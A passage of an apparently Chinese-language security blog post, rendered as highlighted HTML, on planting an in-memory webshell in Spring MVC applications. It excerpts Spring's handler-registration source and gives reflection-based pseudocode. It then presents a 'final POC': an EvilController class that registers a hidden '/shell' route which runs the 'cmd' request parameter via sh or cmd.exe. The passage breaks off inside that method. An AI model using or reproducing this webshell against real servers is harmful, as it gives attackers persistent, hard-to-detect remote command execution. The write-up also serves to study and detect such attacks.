#B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> urlPath </span><span style=\"color: #F97583\">+</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #FFAB70\">&quot;]: There is already &quot;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> getHandlerDescription(mappedHandler) </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot; mapped.&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">urlPath</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">equals(</span><span style=\"color: #FFAB70\">&quot;/&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">isTraceEnabled()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">trace(</span><span style=\"color: #FFAB70\">&quot;Root mapping to &quot;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> getHandlerDescription(handler));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                setRootHandler(resolvedHandler);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">urlPath</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">equals(</span><span style=\"color: #FFAB70\">&quot;/*&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">isTraceEnabled()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">trace(</span><span style=\"color: #FFAB70\">&quot;Default mapping to &quot;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> getHandlerDescription(handler));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                setDefaultHandler(resolvedHandler);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">handlerMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">put(urlPath</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> resolvedHandler);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">isTraceEnabled()) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">logger</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">trace(</span><span style=\"color: #FFAB70\">&quot;Mapped [&quot;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> urlPath </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;] onto &quot;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> getHandlerDescription(handler));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span></code></pre></div><p>我们通过传入 URL 路由 和恶意 bean 即可<br>实现伪代码如下：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #6B737C\">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBeanFactory()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">registerSingleton(</span><span style=\"color: #FFAB70\">&quot;dynamicController&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;me.landgrey.SSOLogin&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance());</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">DefaultAnnotationHandlerMapping</span><span style=\"color: #B392F0\">  dh </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">DefaultAnnotationHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 3. 反射获得 registerHandler Method</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\"> m1 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">handler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">AbstractUrlHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredMethod(</span><span style=\"color: #FFAB70\">&quot;registerHandler&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">String</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Object</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">m1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">m1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">invoke(dh</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;/favicon&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;dynamicController&quot;</span><span style=\"color: #B392F0\">);</span></span></code></pre></div><h2 id=\"0x03-最终实现-POC\"><a href=\"#0x03-最终实现-POC\" class=\"headerlink\" title=\"0x03 最终实现 POC\"></a>0x03 最终实现 POC</h2><p>这里的话我们演示能够适配版本更新的 <code>RequestMappingHandlerMapping</code>及其 registerMapping 方法进行注册</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stoocea</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Controller</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stereotype</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Controller</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">bind</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestMapping</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestContextHolder</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ServletRequestAttributes</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">condition</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">PatternsRequestCondition</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">condition</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestMethodsRequestCondition</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">method</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestMappingInfo</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">method</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestMappingHandlerMapping</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">@</span><span style=\"color: #F97583\">Controller</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> EvilController &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        @</span><span style=\"color: #F97583\">RequestMapping</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/Evil&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> Spring_Controller() </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ClassNotFoundException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">InstantiationException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">IllegalAccessException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">NoSuchMethodException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #FFAB70\">&quot;i am in&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//获取当前上下文环境</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (WebApplicationContext) </span><span style=\"color: #79B8FF\">RequestContextHolder</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentRequestAttributes()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getAttribute(</span><span style=\"color: #FFAB70\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F8F8F8\">0</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//手动注册Controller</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">RequestMappingHandlerMapping</span><span style=\"color: #B392F0\"> r </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(</span><span style=\"color: #79B8FF\">RequestMappingHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\"> method </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Controller_Shell</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredMethod(</span><span style=\"color: #FFAB70\">&quot;shell&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">HttpServletRequest</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">HttpServletResponse</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// 3. 定义访问 controller 的 URL 地址</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">PatternsRequestCondition</span><span style=\"color: #B392F0\"> url </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> PatternsRequestCondition(</span><span style=\"color: #FFAB70\">&quot;/shell&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">RequestMethodsRequestCondition</span><span style=\"color: #B392F0\"> ms </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> RequestMethodsRequestCondition();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// 5. 在内存中动态注册 controller</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">RequestMappingInfo</span><span style=\"color: #B392F0\"> info </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> RequestMappingInfo(url</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> ms</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">r</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">registerMapping(info</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> Controller_Shell()</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> method);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> Controller_Shell&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> shell(</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\"> request</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\"> response) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">boolean</span><span style=\"color: #B392F0\"> isLinux </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> osTyp </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getProperty(</span><span style=\"color: #FFAB70\">&quot;os.name&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (osTyp </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">osTyp</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toLowerCase()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;win&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    isLinux </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">false</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[] cmds </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> isLinux </span><span style=\"color: #F97583\">?</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #FFAB70\">&quot;sh&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;-c&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">)&#125; </span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #FFAB70\">&quot;cmd.exe&quot;</span><span style=\"color: 